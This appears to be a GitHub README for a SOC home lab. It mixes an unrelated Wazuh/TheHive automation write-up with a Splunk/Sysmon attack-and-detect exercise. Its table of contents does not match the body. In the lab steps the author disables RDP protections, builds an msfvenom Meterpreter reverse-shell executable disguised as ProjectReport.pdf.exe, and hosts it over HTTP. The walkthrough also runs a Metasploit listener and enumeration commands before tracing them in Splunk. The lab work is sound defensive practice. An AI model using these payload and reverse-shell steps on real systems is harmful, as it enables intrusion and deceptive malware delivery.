# 👨‍💻SOC Home Lab: Using Splunk & Sysmon🚀  

## Table of Contents 
1. [Introduction](#introduction)
2. [Workflow Overview](#-workflow-overview)
3. [Prerequisites](#-prerequisites)
4. [Network Topology](#-network-topology)
5. [Step 1: Environment Setup](#️-step-1-environment-setup)
6. [Step 2: Network Configuration](#-step-2--network-configuration)
7. [Step 3: Initial Network Scanning](#-step-3--initial-network-scanning-)
8. [Step 4: Scanning & Attempted SMB Exploitation](#step-4-scanning-attempted-smb-exploitation)
9. [Step 5: Creating an RDP Vulnerability](#-step-5-creating-an-rdp-vulnerability-)
10. [Step 6: Payload Creation & Listener Setup](#-step-6--payload-delivery-&-exploitation-attempt)
11. [Step 7: Payload Delivery & Reverse Shell](#️-step-7--payload-delivery-&-reverse-shell-gained)
12. [Step 8: Splunk Analysis of Malware Execution](#-step-8-splunk-analysis-of-malware-execution-)
13. [Step 9: Created a Dashboard for Better Understanding](#-step-9-created-a-dashboard-for-better-understanding-)
13. [Step 10: Correlating Reverse Shell Activity with Splunk Logs](#-step-9-correlating-reverse-shell-activity-with-splunk-logs-)
14. [Next Steps & Future Enhancements](#-next-steps--future-enhancements)
15. [Conclusion](#-conclusion)
16. [Let’s Connect](#-lets-connect)


---  
## 📌Introduction
🔒 Introduction
Welcome to the SOC Automation Project! 🚀

In today’s world, cyber threats are everywhere – from phishing emails to credential dumping attacks using tools like Mimikatz. Security Operations Centers (SOCs) need to act fast to detect, analyze, and respond to incidents in real time.

This project demonstrates how automation can make SOC operations faster and more efficient.

We’ve built a mini SOC homelab with:
-> Windows 10 VM as the endpoint where we generate telemetry
-> Wazuh Manager to detect suspicious activity
-> Shuffle for automation and enrichment using VirusTotal API
-> TheHive for case management and investigation

Key Features:
🔍 Detect suspicious activity (Mimikatz execution)
📤 Forward alerts from Wazuh to Shuffle
🤖 Enrich alerts with VirusTotal threat intelligence
📧 Notify SOC analysts via email
📂 Create cases in TheHive for investigation

This end-to-end automation flow helps SOC teams respond faster, reduce manual effort, and focus on what matters most – stopping attacks.





🌐 Network Setup

SOC Automation lab uses three virtual machines, and because the RAM requirements were quite high, we distributed them across two laptops while keeping them in the same network.

💻 Laptop 1
Ubuntu Server 1 (Wazuh Manager):
-> Collects logs from Windows 10 workstation
-> Detects suspicious activity
-> Sends alerts to Shuffle

💻 Laptop 2
-> Windows 10 Workstation: Generates telemetry by running Mimikatz and sends logs via Wazuh Agent
-> Ubuntu Server 2 (TheHive): Receives enriched alerts and creates cases for SOC analysts
-> Shuffle (SOAR): Automates enrichment with VirusTotal, pushes alerts to TheHive, and sends email notifications

All virtual machines were connected using a bridged network, ensuring seamless communication between laptops as if they were on the same physical network.

🖼️ [Insert Simple Network Topology Diagram – Laptop 1 + Laptop 2 + VMs + Bridge Network + Arrows Showing Communication]


---  


🔄 Workflow Overview
The workflow of SOC Automation Project shows how an attack is detected, enriched, and escalated automatically.

1.Attack Simulation 🖥️
-> Mimikatz is executed on the Windows 10 Workstation to simulate credential dumping.

2.Detection 🔍
-> Wazuh Agent on Windows forwards logs to Wazuh Manager (Laptop 1).
-> Wazuh detects suspicious activity and generates an alert.

3.Automation & Enrichment 🤖
-> The alert is sent to Shuffle (Laptop 2).
-> Shuffle enriches the alert by checking file hashes with VirusTotal.

4.Case Creation 📂
-> The enriched alert is forwarded to TheHive (Laptop 2), where a case is created for SOC investigation.

5.Notification 📧
-> Shuffle sends an email notification to the SOC analyst with a summary of the incident.

🖼️ [Insert Workflow Flowchart – From Attack Simulation to Email Notification]

---  







🌟 Key Highlights
SOC Automation Project stands out because of the following features:

-> End-to-End SOC Workflow: Covers detection, enrichment, case creation, and analyst notification seamlessly.
-> Distributed Setup: Uses two laptops with VMs connected via bridged network to handle heavy RAM requirements efficiently.
-> Realistic Attack Simulation: Uses Mimikatz to simulate credential dumping(T1003), replicating real-world attack scenarios.
-> Automation with SOAR: Automatically enriches alerts using VirusTotal and creates cases in TheHive.
-> Immediate Notifications: Sends emails to SOC analysts for faster response.
-> Hands-On SOC Experience: Closely mimics a real SOC environment, making it perfect for learning and practice.

🖼️ [Insert Screenshot of Your Entire Lab Setup – Virtual Machines Running on Both Laptops]

---  









## 🔧 Prerequisites 

| Requirement               | Description                                                                                    |
| ------------------------- | ---------------------------------------------------------------------------------------------- |
| **Hypervisor**            | VMware Workstation / VirtualBox (for creating and managing virtual machines)                   |
| **Laptop 1**              | Hosts **Ubuntu Server 1 (Wazuh Manager)** – at least 4 GB RAM, 2 CPU cores                     |
| **Laptop 2**              | Hosts **Windows 10 VM**, **Ubuntu Server 2 (TheHive)**, and **Shuffle** – at least 8 GB RAM    |
| **Operating System ISOs** | Windows 10 ISO & Ubuntu Server ISO                                                             |
| **Tools & Services**      | Wazuh Manager & Agent, Shuffle (Cloud or Local), TheHive, Mimikatz, VirusTotal API Key         |
| **Network Setup**         | Bridged Network (so that both laptops & all VMs communicate as if on the same LAN)             |
| **Internet Connection**   | Required initially for downloading updates, Wazuh, TheHive, and registering VirusTotal API key |
| **Storage**               | Sufficient disk space to run 3 VMs and store log data                                          |


🖼️ [Insert Screenshot of VM Settings (RAM, CPU, Network set to Bridged) for Each VM]


---  



🌐 Network Topology

The lab uses two laptops connected through a bridged network, allowing all systems to communicate as if they are on the same LAN.
-> Laptop 1: Hosts Ubuntu Server 1 (Wazuh Manager) – collects logs and forwards alerts.
=> Laptop 2: Hosts Windows 10 Workstation, Ubuntu Server 2 (TheHive), and Shuffle – generates telemetry, enriches alerts, and creates cases.

🖼️ [Insert Simple Network Diagram – Laptop 1 & Laptop 2 with their VMs, connected via Bridged Network, arrows showing data flow]


---  

🛠️ Step 1: Environment Setup
To start the project, I set up the virtual environment across two laptops:

-> Installed VMware Workstation (VirtualBox can also be used).
-> Created three VMs: Windows 10 Workstation, Ubuntu Server 1 (Wazuh Manager), and Ubuntu Server 2 (TheHive).
-> Allocated resources: Windows 10 → 5–6 GB RAM, Wazuh → 4 GB RAM, TheHive → 6–8 GB RAM.
-> Distributed load across two laptops (Laptop 1 hosted Wazuh Manager, Laptop 2 hosted Windows 10, TheHive, and Shuffle).
-> Installed operating systems and set Bridged Network mode so all machines could communicate.

🖼️ [Screenshot of All VMs in VMware/VirtualBox With Resource Allocation and Network Mode Visible]

---  

🌐 Step 2: Network Configuration
After setting up the environment, I configured the network for all virtual machines to ensure proper communication:

-> Ubuntu Server 1 (Wazuh Manager): 10.53.159.19
-> Ubuntu Server 2 (TheHive + Shuffle): 10.53.159.152
-> Windows 10 Workstation: 10.53.159.106

All machines were set to Bridged Network Mode so they could communicate with each other and with the host systems seamlessly.

🖼️ [Screenshot of VM Network Settings & IP Configurations (ip addr/ipconfig output) for Each VM]


---  


🛠️ Step 3: Installation

For this project, the following tools were installed:
-> Sysmon on the Windows 10 VM (for detailed telemetry)
-> Wazuh SIEM on Ubuntu Server (for centralized log collection & monitoring)
-> TheHive on Ubuntu Server (for alert management & case handling)

📺 Reference Guide:
  🔗 Click Here for Installation Guide / Video

This guide/video includes:
-> Sysmon installation steps
-> Wazuh manager, dashboard installation
-> TheHive installation and service setup

🖼️ Image Suggestion:

🖼️ [Single Collage Screenshot of Sysmon CMD Output + Wazuh Dashboard + TheHive Login Page]
(This single collage image will visually represent that all three tools were successfully installed.)

---  




🧩 Step 4: TheHive Configuration

In this step, TheHive was fully configured by modifying its dependencies (Cassandra, Elasticsearch) and its own configuration file.
Below are the detailed commands and configuration changes used during the setup.
 
🛠️ 4.1 Cassandra Configuration

    sudo su
    nano /etc/cassandra/cassandra.yml
🔧 Changes made:
-> cluster_name: Changed to SOC Project
-> listen_address: Kept as localhost
-> rpc_address: Kept as localhost
-> seed_provider: Ensured value is localhost

Then restart Cassandra to apply changes:

    systemctl stop cassandra.service
    rm -rf /var/lib/cassandra/*
    systemctl start cassandra.service
    systemctl status cassandra.service
✅ Expected Result: Cassandra service should be in active (running) state.

🖼️ Image Suggestion:
🖼️ [Screenshot of Cassandra config file (showing cluster_name) + terminal showing Cassandra service running]


📡 4.2 Elasticsearch Configuration
Edit the Elasticsearch configuration:

    nano /etc/elasticsearch/elasticsearch.yml
🔧 Changes made:
-> cluster.name: Changed to SOC Project
-> network.host: Uncommented and set to localhost
-> http.port: Uncommented and kept default (9200)
-> cluster.initial_master_nodes: Removed node2, kept only node1

Start and enable Elasticsearch:

    systemctl start elasticsearch
    systemctl enable elasticsearch
    systemctl status elasticsearch
✅ Expected Result: Elasticsearch should be active (running).

🖼️ Image Suggestion:
🖼️ [Screenshot of elasticsearch.yml + terminal showing Elasticsearch running]


📂 4.3 TheHive Directory Permissions
Check directory ownership:

    ls -la /opt/thp
If access is restricted to root, grant permissions to TheHive user:
    chown -R thehive:thehive /opt/thp
    
    ls -la /opt/thp
✅ Expected Result: Ownership should now belong to thehive:thehive.

🖼️ Image Suggestion:
🖼️ [Screenshot of directory permissions before and after chown]


⚙️ 4.4 TheHive Application Configuration
Open TheHive configuration file:

    nano /etc/thehive/application.conf
🔧 Changes made:
-> Ensured hostname is set to localhost

Then start, enable, and check TheHive:

    systemctl start thehive
    systemctl enable thehive
    systemctl status thehive
✅ Expected Result: TheHive should now be active (running).

Also re-check Cassandra & Elasticsearch status to ensure everything is running:

    systemctl status cassandra.service
    systemctl status elasticsearch.service


🌐 4.5 Access TheHive UI
Open a browser and navigate to:

    http://localhost:9000
Login with default credentials:

    Username: admin@admin.local
    Password: secret

🖼️ Image Suggestion:
🖼️ [Screenshot of TheHive login page after first successful run]


🧠 4.6 JVM Options Update
Edit JVM options to adjust memory allocation:

    nano /etc/elasticsearch/jvm.options.d/jvm.options
    -Dlog4j2.formatMsgNoLookups=true
    -Xms2g
    -Xmx2g
✅ At this stage, TheHive, Cassandra, and Elasticsearch should all be running and accessible, completing the configuration process.



















---  

## 🔄 Step 5: Creating an RDP Vulnerability 💻🔓  
Since SMB was a dead end, I decided to create my own vulnerability by enabling Remote Desktop Protocol (RDP, Port 3389) and intentionally misconfiguring it.  

🛠 Steps Taken:  
  Enabled Remote Desktop from the system settings.  
  Nmap scan still showed RDP as closed 🚫.  
  🗝 Registry Tweak:  
    Opened regedit → navigated to:  

    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server 

  Changed fDenyTSConnections value to 0 ✅ (enabled RDP directly from registry, bypassing GUI).  

🔄 Service Management:  
  Located TermService (Remote Desktop Services).  
  Stopped → Started → Restarted multiple times to ensure activation.  
  ⚙ Group Policy Configuration (gpedit.msc):  
      Enabled Allow users to connect remotely under:  

    Computer Configuration → Administrative Templates → Windows Components → Remote Desktop Services → Remote Desktop Session Host → Connections  

  Ensured Network Level Authentication was disabled to reduce restrictions.  

📊 Final Check:  
    Ran Nmap again → ✅ Port 3389 OPEN 🎉  
    Ready for RDP exploitation in the next step!  
 
<p align="center">
  <img src="https://github.com/user-attachments/assets/9c3f884c-812c-4c11-9659-1e4f9a9926ed" alt="LAN Segment & IP settings" width="250" height="199"/>
  <img src="https://github.com/user-attachments/assets/d57030d2-f85d-49b7-a4a0-fbea9f53cac1" alt="VMware Settings" width="250" height="199"/>
  <img src="https://github.com/user-attachments/assets/697bc3cc-0083-41f9-9a5e-e5334e51d28d" alt="VMware Settings" width="250" height="199"/>
</p>

---  


## 🚀 Step 6: 🎯 Payload Delivery & Exploitation Attempt
  With RDP (3389) now open 🔓, I moved on to creating and delivering a malicious payload for exploitation.  
  🛠 Payload Creation (MSFvenom)  

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.3 LPORT=4444 -f exe -o ProjectReport.pdf.exe  

💡 Payload: Windows Meterpreter Reverse TCP  
📍 LHOST: Attacker machine IP  
📍 LPORT: Listener port for reverse shell  

📡 Setting Up the Listener (Metasploit)  

    msfconsole  
    use exploit/multi/handler  
    set PAYLOAD windows/meterpreter/reverse_tcp  
    set LHOST 192.168.56.3  
    set LPORT 4444  
    exploit  
🎯 Waiting for the target to execute the payload...  

🌐 Hosting Payload with Python  
To easily transfer the file to the target, I started a Python HTTP server:  

    python3 -m http.server 9999  

📂 Payload hosted at:  

    http://192.168.56.3:9999/ProjectReport.pdf.exe  
📸 Result:  
    Payload successfully hosted & accessible ✅  
R    eady for delivery to target 🎯 (execution attempt covered in the next step)   

<p align="center">
  <img src="https://github.com/user-attachments/assets/3e75489f-aa7b-4aa8-abca-54ea410ca2d7" alt="LAN Segment & IP settings" width="250" height="199"/>
  <img src="https://github.com/user-attachments/assets/b384ec69-3a8b-4c68-9cf5-a01ae3a25b9f" alt="VMware Settings" width="250" height="199"/>
  <img src="https://github.com/user-attachments/assets/2d1547f3-8caa-4233-88ec-084f942687f1" alt="VMware Settings" width="250" height="199"/>
</p>

---  

## 🖥️ Step 7: 🎯 Payload Delivery & Reverse Shell Gained
  💻 On Target (Windows 10):  
    1️⃣ Opened browser → http://192.168.56.3:9999 🌐  
    2️⃣ Downloaded projectreport.pdf 📄 (actually projectreport.pdf.exe 🐍 — .exe hidden)  
    3️⃣ ⚠️ Chrome Warning: “File contains malware” — Ignored & kept file  
    4️⃣ ⚠️ Windows Defender Alert: “File may be harmful” — Chose to run anyway 🛑  

  💥 Execution & Shell Access  
  Upon execution, reverse TCP connection established 🔗  
  Meterpreter session opened on Kali 🎉  

  🔍 Post-Exploitation Actions  
  Inside Meterpreter:  

      ls  
      shell  
      ipconfig  
      ipconfig /all  
      net localgroup  
      net user  

  📌 Gathered network info, checked user accounts, and enumerated privileges 👀  

<p align="center">
  <img src="https://github.com/user-attachments/assets/ca0e12ba-a017-4a4f-9d0b-b420e156b3ca" alt="LAN Segment & IP settings" width="250" height="199"/>
  <img src="https://github.com/user-attachments/assets/9a5db2c0-4e8e-431e-9fb3-7a66d3c37968" alt="VMware Settings" width="250" height="199"/>
  <img src="https://github.com/user-attachments/assets/0eaa2f31-45c5-4fe3-afab-6fe42176bf5a" alt="VMware Settings" width="250" height="199"/>
</p>

---  

## 📊 Step 8: Splunk Analysis of Malware Execution 🕵️‍♂️
  💡 Objective: Track malware activity (projectreport.pdf.exe) using Splunk Search & Reporting.  
  🛠️ Actions Performed  
  1️⃣ Opened Splunk → Search & Reporting App 📈  
  2️⃣ Ran initial search:  

      index=endpoint  
  🔍 (endpoint was the index created earlier to store endpoint logs — including Sysmon data)  
  3️⃣ Located multiple logs for system activities.  
  4️⃣ Focused search to find malware traces:  
<p align="center">
  <img src="https://github.com/user-attachments/assets/03c42cf9-6fd0-40eb-a969-849e7c6e6a43" alt="LAN Segment & IP settings" width="350" height="250"/>
</p>

    index=endpoint "projectreport.pdf.exe"  
  📌 Found several logs related to the file execution.  
  5️⃣ Opened a specific log → copied Process GUID 🆔  
  6️⃣ Queried again with the GUID:  
  
      index=endpoint "<Process_GUID>"  
  📊 Retrieved detailed logs of the malware process lifecycle.  
  7️⃣ Refined output with table formatting for clarity:  

    index=endpoint "<Process_GUID>"  | table _time, parent_process, image, command_line  

  🖥️ Columns included:  
    _time ⏱️ — Timestamp of event  
    parent_process 🏗️ — Process that spawned this activity  
    image 🖼️ — Executable file path  
    command_line 💻 — Full execution command  

<p align="center">
  <img src="https://github.com/user-attachments/assets/69f2784d-7fe3-4a02-aacd-1a3a98ba3655" alt="LAN Segment & IP settings" width="350" height="250"/>
</p>

📌 Result :   
    ✅ Successfully correlated malware file execution with process hierarchy and timeline.  
    ✅ Identified parent process, child process, full path, and execution command for forensic reporting.  

---  

## 🛠️ Step 9: Created a Dashboard for Better Understanding
Designed and implemented a comprehensive Splunk dashboard to visualize key security metrics and events. This dashboard includes charts for top source IPs, destination ports, user logons, process executions, suspicious parent-child process relationships, reverse shell indicators, registry key changes, and detailed endpoint logs. It helps in monitoring and quickly identifying potential security incidents during the SOC lab exercises.

<img width="1904" height="500" alt="Dashboard_graphs" src="https://github.com/user-attachments/assets/555803d1-8449-4495-9118-12fb5ab0ae54" />


---  

## 🔍 Step 10: Correlating Reverse Shell Activity with Splunk Logs 🖥️💣
💡 Objective: Map the attacker’s actions (Meterpreter session) to endpoint telemetry collected by Splunk for full visibility.  

🛠️ Actions Performed  
1️⃣ From Step 7, we had a Meterpreter session opened after executing projectreport.pdf.exe.  
2️⃣ We already had the Process GUID for the malware execution from Step 8.  
This GUID was used as the pivot point to find related activity.  
3️⃣ Ran a broader search in Splunk to catch all processes spawned after the malware execution:  

    index=endpoint "<Process_GUID>" OR parent_process="<Malware_Process_Path>"  
📌 This helped reveal not only the malware process but also child processes triggered by it.  

4️⃣ Looked specifically for commands that matched the attacker’s actions:  
ipconfig, net user, net localgroup 🧾  
These would appear in logs as part of cmd.exe or powershell.exe executions.  
5️⃣ Refined query for command-line activities:  

    index=endpoint ("ipconfig" OR "net user" OR "net localgroup") | table _time, parent_process, image, command_line  

💡 This showed:  
Timestamps matching when commands were run in Meterpreter shell.  
Parent process as cmd.exe launched by the malware.  
6️⃣ Cross-checked the timeline of these events with the reverse shell timestamps in Kali Linux MSF console to validate correlation ✅.  

📌 Result  
✅ Successfully confirmed that the attacker’s shell commands directly originated from the malware execution process.  
✅ Created a full forensic chain:  
File Download → Execution → Reverse Shell → Commands → Detection in Splunk 🔄  

---  

## 🚀 Next Steps & Future Enhancements  
🔍 Option 1: Deploy ELK Stack for deeper, faster, and more flexible log analysis — fully customized for your environment.  
🛡️ Option 2: Deploy Wazuh SIEM (built on ELK) for advanced threat detection, automated correlation rules, and ready-made SOC dashboards.  
🐍 Use Python automation scripts to streamline the attack workflow.  
📟 Build a more advanced SOC dashboard that triggers real-time alerts when suspicious signatures, malware patterns, or specific attack indicators are detected — allowing analysts to respond instantly.  

---  

## 🏁 Conclusion  
Through this project, we were able to:  
🏗️ Build a fully functional cybersecurity home lab  
💣 Simulate & analyze malware-based attacks  
📊 Leverage Splunk for effective threat detection and incident investigation  
⚠️ Disclaimer: This work is strictly for educational purposes. Any unauthorized use of these methods is illegal and unethical.  

---  

## 📌 Let’s Connect  
💼 [LinkedIn](https://www.linkedin.com/in/pranavkale1124/)  
🖥️ [GitHub](https://github.com/Pranav-Kale)  
